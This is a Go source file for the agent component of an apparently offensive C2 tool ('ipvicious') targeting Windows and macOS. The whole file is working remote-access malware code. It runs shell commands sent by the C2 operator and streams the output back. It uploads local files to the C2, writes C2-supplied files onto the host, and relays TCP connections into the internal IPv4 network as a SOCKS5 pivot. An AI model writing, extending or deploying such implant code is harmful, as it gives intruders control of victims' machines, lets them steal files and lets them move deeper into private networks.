//go:build windows || darwin

// Package agent implements the remote-control capabilities of the agent:
// command execution, file upload (agent → C2), and file download (C2 → agent).
//
// All functions are designed to be called from goroutines spawned by the
// tunnel.ClientTunnel callbacks and communicate results back to the C2 server
// through the tunnel send queue.
//
// OS-specific shell invocation (cmd.exe on Windows, /bin/sh on macOS) lives in
// shell_windows.go and shell_darwin.go respectively.
package agent

import (
	"fmt"
	"io"
	"log"
	"os"
	"sync"

	"ipvicious/internal/protocol"
	"ipvicious/internal/tunnel"
)

// Agent wraps a ClientTunnel and exposes remote-control handlers.
// The tunnel's OnCmd / OnFileGet / OnFilePut / OnStreamOpen callbacks are
// wired to the corresponding Agent methods by New().
type Agent struct {
	tun         *tunnel.ClientTunnel
	fwMu        sync.Mutex             // protects fileWriters
	fileWriters map[uint32]*fileWriter // active download sessions keyed by streamID
}

// fileWriter holds an open file handle for an in-progress C2→agent file download.
type fileWriter struct {
	path string
	f    *os.File
}

// New creates an Agent backed by the given ClientTunnel and wires all callbacks.
func New(tun *tunnel.ClientTunnel) *Agent {
	a := &Agent{
		tun:         tun,
		fileWriters: make(map[uint32]*fileWriter),
	}
	tun.OnCmd = a.handleCmd
	tun.OnFileGet = a.handleFileGet
	tun.OnFilePut = a.handleFilePut
	tun.OnStreamOpen = a.handleStreamOpen
	tun.OnFileData = a.handleFileData
	return a
}

// ─── command execution ────────────────────────────────────────────────────────

// handleCmd executes cmd via the platform shell (cmd.exe /C on Windows,
// /bin/sh -c on macOS), captures combined stdout/stderr, and returns the
// output to the C2 server as TypeCmdOut frames followed by TypeAck.
// runCommand is provided by shell_windows.go or shell_darwin.go.
func (a *Agent) handleCmd(streamID uint32, seqNo uint32, cmd string) {
	output, execErr := runCommand(cmd)
	if execErr != nil {
		// Append error description so the operator can see the exit status.
		output = append(output,
			[]byte(fmt.Sprintf("\n[exit error: %v]", execErr))...)
	}

	// Chunk output into MaxData-sized TypeCmdOut frames.
	seq := seqNo
	for len(output) > 0 {
		chunk := output
		if len(chunk) > protocol.MaxData {
			chunk = output[:protocol.MaxData]
		}
		output = output[len(chunk):]
		seq++
		a.enqueue(protocol.TypeCmdOut, streamID, seq, chunk)
	}
	// End-of-output marker.
	a.enqueue(protocol.TypeAck, streamID, seq+1, nil)
}

// ─── file upload (agent → C2) ─────────────────────────────────────────────────

// handleFileGet reads a local file and streams its contents to the C2 as
// TypeFileData frames, finishing with TypeFileEnd.
func (a *Agent) handleFileGet(streamID uint32, seqNo uint32, path string) {
	f, err := os.Open(path)
	if err != nil {
		a.sendError(streamID, seqNo, fmt.Sprintf("open %s: %v", path, err))
		return
	}
	defer f.Close()

	buf := make([]byte, protocol.MaxData)
	seq := seqNo
	for {
		n, readErr := f.Read(buf)
		if n > 0 {
			seq++
			chunk := make([]byte, n)
			copy(chunk, buf[:n])
			a.enqueue(protocol.TypeFileData, streamID, seq, chunk)
		}
		if readErr == io.EOF {
			break
		}
		if readErr != nil {
			a.sendError(streamID, seq, fmt.Sprintf("read %s: %v", path, readErr))
			return
		}
	}
	a.enqueue(protocol.TypeFileEnd, streamID, seq+1, nil)
	log.Printf("[agent] upload complete: %s", path)
}

// ─── file download (C2 → agent) ───────────────────────────────────────────────

// handleFilePut receives the first FilePut frame, creates the destination file,
// writes the first data chunk, and registers a fileWriter so that subsequent
// TypeFileData frames (dispatched via HandleFileData) can continue writing.
//
// TypeFilePut payload layout:
//
//	[2-byte big-endian path length][path bytes][first data chunk]
func (a *Agent) handleFilePut(streamID uint32, seqNo uint32, data []byte) {
	path, firstChunk, err := protocol.DecodeFilePut(data)
	if err != nil {
		a.sendError(streamID, seqNo, fmt.Sprintf("bad FilePut: %v", err))
		return
	}

	f, err := os.Create(path)
	if err != nil {
		a.sendError(streamID, seqNo, fmt.Sprintf("create %s: %v", path, err))
		return
	}

	if len(firstChunk) > 0 {
		if _, err := f.Write(firstChunk); err != nil {
			f.Close()
			a.sendError(streamID, seqNo, fmt.Sprintf("write %s: %v", path, err))
			return
		}
	}

	a.fwMu.Lock()
	a.fileWriters[streamID] = &fileWriter{path: path, f: f}
	a.fwMu.Unlock()
	log.Printf("[agent] download started: %s (stream %d)", path, streamID)
}

// handleFileData appends a data chunk to an ongoing file download.
// last=true closes and finalises the file.
func (a *Agent) handleFileData(streamID uint32, _ uint32, data []byte, last bool) {
	a.fwMu.Lock()
	fw, ok := a.fileWriters[streamID]
	if !ok {
		a.fwMu.Unlock()
		return
	}
	if len(data) > 0 {
		if _, err := fw.f.Write(data); err != nil {
			log.Printf("[agent] write error for %s: %v", fw.path, err)
			fw.f.Close()
			delete(a.fileWriters, streamID)
			a.fwMu.Unlock()
			return
		}
	}
	if last {
		fw.f.Close()
		path := fw.path
		delete(a.fileWriters, streamID)
		a.fwMu.Unlock()
		log.Printf("[agent] download complete: %s", path)
		return
	}
	a.fwMu.Unlock()
}

// ─── SOCKS5 relay (C2 → agent → IPv4 target) ─────────────────────────────────

// handleStreamOpen is invoked when the C2 instructs the agent to open a TCP
// connection to a target on the internal IPv4 network.
func (a *Agent) handleStreamOpen(streamID uint32, addrType byte, addr []byte, port uint16) {
	target, err := resolveTarget(addrType, addr, port)
	if err != nil {
		log.Printf("[agent] stream %d: resolve error: %v", streamID, err)
		a.tun.Streams().Remove(streamID) // clean up pre-allocated stream entry
		a.enqueue(protocol.TypeStreamClose, streamID, 0, nil)
		return
	}
	log.Printf("[agent] stream %d → %s", streamID, target)
	go a.relayStream(streamID, target)
}

// ─── helpers ─────────────────────────────────────────────────────────────────

// enqueue places a frame on the tunnel send queue.
func (a *Agent) enqueue(typ byte, streamID uint32, seqNo uint32, data []byte) {
	a.tun.Enqueue(&protocol.Frame{
		Type:     typ,
		StreamID: streamID,
		SeqNo:    seqNo,
		Data:     data,
	})
}

// sendError sends a TypeError frame to the C2 and logs the message locally.
func (a *Agent) sendError(streamID uint32, seqNo uint32, msg string) {
	log.Printf("[agent] error (stream %d): %s", streamID, msg)
	a.enqueue(protocol.TypeError, streamID, seqNo, []byte(msg))
}
